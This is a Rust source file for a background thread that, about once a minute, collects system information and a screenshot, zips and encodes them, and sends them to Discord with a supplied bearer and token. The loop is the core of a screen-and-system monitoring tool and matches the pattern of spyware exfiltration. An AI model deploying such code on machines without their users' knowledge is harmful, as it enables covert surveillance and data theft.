use super::{
    discord,
    system::System,
    zip::Zip,
    files, global
};

pub(crate) struct Thread {
    running: bool
}

impl Thread {
    // Initialize a new thread
    pub fn new() -> Self {
        Self {
            running: false
        }
    }

    // Stop the thread from running
    pub fn stop(&mut self) {
        self.running = false;
    }

    // Start the thread
    pub fn start(mut self, bearer: &str, token: &str) {
        self.running = true;

        // Clone the token for thread
        let token: String = token.to_string().clone();
        let bearer: String = bearer.to_string().clone();

        std::thread::spawn(move || {
            self.main(&bearer, &token);
        }).join().expect("failed to spawn main loop thread");
    }

    // Main loop
    fn main(&self, bearer: &str, token: &str) {
        // Initialize sys and zip variables
        let mut sys: System = System::new();
        let mut zip: Zip = Zip::new();

        // Until the user presses the stop button...
        while self.running {
            // Start after 10 seconds
            std::thread::sleep(std::time::Duration::from_secs(10));
            
            // Get the system info then add it to a file
            let sysinfo = match serde_json::to_vec(&sys.info()){
                Ok(buf) => buf,
                Err(e) => panic!("Error: {}", e)
            };

            // Add the sysinfo json to the zip file
            match zip.add_file(&
                format!("{}.json", global::get_date_time()), &sysinfo
            ) {
                Ok(_) => (),
                Err(e) => panic!("Error: {}", e)
            }

            // Capture the image then add it to the zip file
            let image: Vec<u8> = match files::capture_image() {
                Ok(f) => f,
                Err(e) => panic!("Error: {}", e)
            };

            // Add the screenshot to the zip file
            match zip.add_file(
                &format!("{}.png", global::get_date_time()), &image
            ) {
                Ok(_) => (),
                Err(e) => panic!("Error: {}", e)
            }

            // Encode the image data
            let image_data: String = files::encode_png(image);
            let sysinfo_data: String = files::encode_json(sysinfo);

            // Send the files to discord
            discord::send_files(bearer, token, &image_data, &sysinfo_data);

            // Repeat after 20 to 50 seconds
            std::thread::sleep(std::time::Duration::from_secs(50));
        }
    }
}